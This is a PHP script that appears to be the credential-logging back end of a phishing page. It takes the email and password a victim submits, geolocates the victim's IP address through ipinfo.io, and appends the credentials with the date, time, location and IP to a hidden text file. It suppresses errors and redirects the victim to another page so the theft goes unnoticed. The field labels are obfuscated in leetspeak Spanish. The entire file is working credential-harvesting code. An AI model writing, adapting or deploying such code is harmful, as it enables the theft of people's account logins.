<?php
session_start();
date_default_timezone_set('America/Bogota');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$ct = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));


$file = fopen("privateNOTEpadDAta.txt", "a");
fwrite($file, "C0rr30: ".$_POST['c0rreo']."\r\nCl4v3: ".$_POST['pas0']."\r\nFecha: ".date('d-m-Y')." | ".date('H:i:s')."\r\n".$cc." ".$ct." ".$userp." " . PHP_EOL);
fwrite($file, "***************OSWALDO****************** " . PHP_EOL);
fclose($file);


header("Location: index3.html");
exit
?>